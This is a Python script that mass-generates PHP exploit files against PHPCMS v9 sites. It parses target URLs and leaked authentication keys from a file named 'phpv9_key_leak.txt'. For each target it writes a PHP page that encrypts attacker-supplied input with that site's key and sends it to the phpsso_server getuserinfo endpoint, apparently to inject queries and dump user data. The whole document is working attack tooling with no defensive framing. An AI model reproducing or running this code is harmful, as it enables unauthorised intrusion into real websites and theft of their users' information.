import requests
import os
import re

keys=[]
#if os.path.exists('v9.php'):
 #   print('[+]ok v9.php')
##  print('[-]not found v9.php')
  #  exit()

xs=open('saveurl.txt','w')
xs.close()

print('[+]Write url')
dw=open('phpv9_key_leak.txt','r')
for j in dw.readlines():
    ldw="".join(j.split('\n'))
    qe = re.finditer('(http|https)://(www.)?(\w+(\.)?)+', ldw)
    for q in qe:
        rc = re.findall("[a-zA-z]+://[^\s]*", str(q))
        for j in rc:
            we = "{}".format(j).replace('>', '').replace("'", '')
            print(we,file=open('saveurl.txt','a'))

wc=[]
lo=open('keys.txt','w')
lo.close()

dkv=open('phpv9_key_leak.txt','r')
for r in dkv.readlines():
    wq="".join(r.split('\n'))
    qe=re.sub('(http|https)://(www.)?(\w+(\.)?)+','',wq)
    qc=re.sub('\|','',str(qe))
    tx=re.findall('[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]',str(qc))
    for k in tx:
        print(k,file=open('keys.txt','a'))


pds2=[]
wqe2=[]
pds=open('saveurl.txt','r')
wqe=open('keys.txt','r')
for b in pds.readlines():
    pds2.append("".join(b.split('\n')))

for w in wqe.readlines():
    wqe2.append("".join(w.split('\n')))

for x in range(int(len(pds2))):
    wwd=open('scv/{}.php'.format(x),'a+')

dr=os.listdir('scv')
for d in range(0,len(pds2)):
    print("""<?php
set_time_limit(0);
$wang_url = '{}'; """.format(pds2[d])+"""
$auth_key = '{}';""".format(wqe2[d])+"""
$str = "uid=1" . stripslashes($_GET['id']);
$encode = sys_auth($str, 'ENCODE', $auth_key);
$content = file_get_contents($wang_url . "/phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data=" . $encode);
echo $content;
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
{
    $key_length = 4;
    $key = md5($key);
    $fixedkey = hash('md5', $key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(hash('md5', microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = hash('md5', substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
    $i = 0;
    $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i < $string_length; $i++) {
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if ($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}
?>

    """,file=open('scv/{}'.format(dr[d]),'a'))
